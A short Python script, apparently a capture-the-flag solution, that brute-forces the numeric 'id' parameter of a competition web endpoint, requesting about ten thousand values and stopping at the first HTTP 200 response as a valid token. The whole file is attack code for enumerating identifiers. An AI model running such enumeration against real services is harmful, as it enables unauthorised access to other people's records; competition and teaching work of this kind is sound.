import requests

url = "https://6431c52a-d004-4372-b780-21125fe34cf3.offsec.m0lecon.it/lot?id="

headers_base = {

    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Connection": "close"
}

for i in range(10000):              # 0000 → 9999
    token = i+9          # <-- QUI il 4d

   

    r = requests.get(url+str(token))

    print(f"{token} | {r.status_code} | len={len(r.content)}")

    if r.status_code == 200 :
        print("✅ TOKEN VALIDO:", token)
        break
